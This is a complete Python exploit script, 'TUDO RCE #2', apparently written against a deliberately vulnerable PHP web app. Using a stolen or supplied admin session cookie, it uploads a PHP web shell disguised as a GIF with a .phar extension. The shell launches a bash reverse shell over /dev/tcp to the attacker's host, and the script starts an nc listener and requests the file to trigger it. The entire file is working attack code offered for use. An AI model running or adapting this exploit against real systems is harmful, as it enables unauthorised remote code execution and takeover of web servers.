#!/usr/bin/python3

# @title  TUDO RCE #2
# @author William Moody
# @date   10.03.2021

import requests
import sys
import subprocess
import string
import random
import time

if len(sys.argv) != 4:
	print("usage: %s TARGET HOST ADMIN_PHPSESSID" % sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
host   = sys.argv[2]
sessid = sys.argv[3]

lport = 9001
evil = ''.join(random.choice(string.ascii_letters) for _ in range(10))
payload = "GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'\");?>"%\
			(host,lport)

def upload_image():
	f = {
		'image':('%s.phar'%evil,payload,'image/gif'),
		'title':(None,evil)
	}
	c = {"PHPSESSID":sessid}
	r = requests.post("http://%s/admin/upload_image.php"%target,
		cookies=c,
		files=f,
		allow_redirects=False
	)
	return "Success" in r.text

if upload_image():
	print("[+] Successfully uploaded script (%s.phar)!"%evil)
else:
	print("[-] Failed while uploading script.")
	sys.exit(-1)

print("[*] Starting reverse shell...")
subprocess.Popen(["nc","-nvlp","%d"%lport])
time.sleep(1)
requests.get("http://%s/images/%s.phar"%(target,evil))

while True:
	pass
